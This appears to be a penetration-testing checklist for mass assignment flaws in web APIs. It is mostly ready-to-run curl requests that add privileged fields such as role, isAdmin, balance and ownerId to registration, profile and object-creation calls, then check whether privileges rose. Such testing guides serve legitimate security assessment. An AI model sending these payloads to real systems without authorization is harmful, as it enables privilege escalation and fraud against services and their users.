# Mass Assignment / Parameter Pollution Testing

## Objective

Identify endpoints where the application automatically binds all submitted request parameters to internal data model properties — allowing attackers to set fields that should not be user-controllable (e.g., `isAdmin`, `role`, `balance`, `verified`).

---

## 1. Background

Mass assignment vulnerabilities occur when:
- Frameworks auto-bind JSON/form parameters to model objects
- The developer does not implement an allowlist of settable fields
- Extra parameters are silently accepted without error

Affected frameworks:
- **Rails** — `params.require(:user).permit(...)` if not configured
- **Django** — Serializer without explicit `read_only_fields`
- **Spring** — `@ModelAttribute` without `@InitBinder` allowlist
- **Laravel** — `$guarded` not set, or `$fillable` too permissive
- **Node/Express** — `req.body` spread into model directly

---

## 2. Identify Candidate Endpoints

Target endpoints that update user/object data:

```
POST /api/v1/register
POST /api/v1/users
PUT  /api/v1/users/{id}
PATCH /api/v1/profile
POST /api/v1/account/settings
PUT  /api/v1/orders/{id}
```

---

## 3. Discovery — What Fields Exist?

Enumerate all possible model fields before testing:

```bash
# Step 1: GET the object to see all returned fields
curl -s https://target/api/v1/me \
  -H "Authorization: Bearer USER_TOKEN" | python3 -m json.tool

# Note all fields in the response
# These are candidates for write via mass assignment

# Step 2: Check API documentation
curl -s https://target/v3/api-docs | python3 -m json.tool | grep -A 5 "User\|Profile"
```

---

## 4. Registration Endpoint Testing

```bash
# Normal registration
curl -si -X POST https://target/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test@1234","name":"Test"}' | grep HTTP

# With privileged fields added
curl -si -X POST https://target/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{
    "email":"test2@test.com",
    "password":"Test@1234",
    "name":"Test",
    "role":"admin",
    "isAdmin":true,
    "verified":true,
    "emailVerified":true,
    "balance":99999,
    "subscriptionTier":"premium",
    "access_level":9,
    "permissions":["admin","superuser"],
    "is_staff":true,
    "is_superuser":true
  }' | grep HTTP

# Then check what was actually set
curl -s https://target/api/v1/me \
  -H "Authorization: Bearer NEW_USER_TOKEN" | python3 -m json.tool
```

---

## 5. Profile Update Endpoint Testing

```bash
USER_TOKEN="low_priv_user_token"

# Normal update
curl -si -X PUT https://target/api/v1/profile \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Updated Name"}' | grep HTTP

# With privileged fields
curl -si -X PUT https://target/api/v1/profile \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Updated Name",
    "role":"admin",
    "isAdmin":true,
    "balance":99999,
    "credits":10000,
    "subscriptionPlan":"enterprise",
    "emailVerified":true,
    "id":1,
    "_id":"admin_user_object_id"
  }' | grep HTTP

# Verify if any privileged field was actually modified
curl -s https://target/api/v1/me \
  -H "Authorization: Bearer $USER_TOKEN" | python3 -m json.tool | grep -iE "role|admin|balance|credits"
```

---

## 6. Object Creation Endpoint

```bash
# Create an object with extra fields
curl -si -X POST https://target/api/v1/projects \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Test Project",
    "ownerId":"ADMIN_USER_ID",
    "isPublic":true,
    "tier":"enterprise",
    "maxUsers":9999,
    "approved":true
  }' | grep HTTP

# Check if ownerId was accepted (would IDOR into admin ownership)
curl -s https://target/api/v1/projects/NEW_PROJECT_ID \
  -H "Authorization: Bearer ADMIN_TOKEN" | grep "ownerId"
```

---

## 7. Nested Object / Relationship Mass Assignment

```bash
# Test nested object properties
curl -si -X PUT https://target/api/v1/profile \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Test",
    "subscription": {"plan":"enterprise","expiresAt":"2099-12-31"},
    "billing": {"balance":99999},
    "account": {"role":"admin","verified":true}
  }' | grep HTTP
```

---

## 8. Form-Based Mass Assignment (PHP/Rails)

```bash
# Traditional form POST
curl -si -X POST https://target/account/update \
  -H "Cookie: session=USER_TOKEN" \
  -d "name=Test&email=test@test.com&role=admin&is_admin=1&verified=1" | grep HTTP

# Array parameters (Rails-style)
curl -si -X POST https://target/account/update \
  -H "Cookie: session=USER_TOKEN" \
  -d "user[name]=Test&user[role]=admin&user[is_admin]=true" | grep HTTP
```

---

## 9. Verification — Check What Was Modified

After each test, verify the actual state:

```bash
# Check own account for modified fields
curl -s https://target/api/v1/me \
  -H "Authorization: Bearer $USER_TOKEN" | python3 -m json.tool

# Try accessing admin functions with the potentially escalated account
curl -si https://target/api/admin/users \
  -H "Authorization: Bearer $USER_TOKEN" | grep HTTP

# Check balance/credits change
curl -s https://target/api/v1/account/balance \
  -H "Authorization: Bearer $USER_TOKEN" | grep "balance\|credits"
```

---

## Evidence to Capture

- The PUT/POST request with extra privileged fields included
- The GET response before and after showing what changed
- Admin endpoint access success (if role escalation worked)
- Original field value vs post-mass-assignment value

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Role field accepted in registration | Pass/Fail | High-Critical |
| isAdmin / is_staff writeable | Pass/Fail | High-Critical |
| Balance / credits writeable | Pass/Fail | High |
| Email verification status writeable | Pass/Fail | Medium-High |
| ownerId writeable (IDOR chain) | Pass/Fail | High |
| Subscription tier writeable | Pass/Fail | Medium-High |
